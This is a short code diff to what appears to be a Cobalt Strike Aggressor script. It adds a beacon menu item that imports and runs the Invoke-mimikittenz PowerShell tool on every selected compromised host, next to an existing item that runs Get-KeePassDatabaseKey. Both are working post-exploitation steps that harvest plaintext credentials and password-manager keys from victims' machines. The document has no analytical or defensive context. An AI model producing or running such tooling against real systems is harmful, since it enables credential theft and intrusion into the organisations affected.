@@ -52,6 +52,15 @@ popup beacon_bottom {
 				bpowershell($bid, "Get-KeePassDatabaseKey -Verbose");
 			}
 		}
+		item "Invoke-mimikittenz"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($bid, "powershell-import Invoke-mimikittenz.ps1");
+				bpowershell_import($bid, script_resource("scripts/Invoke-mimikittenz.ps1"));
+				binput($bid, "powershell Invoke-mimikittenz");
+				bpowershell($bid, "Invoke-mimikittenz");
+			}
+		}
 	}
 }
 
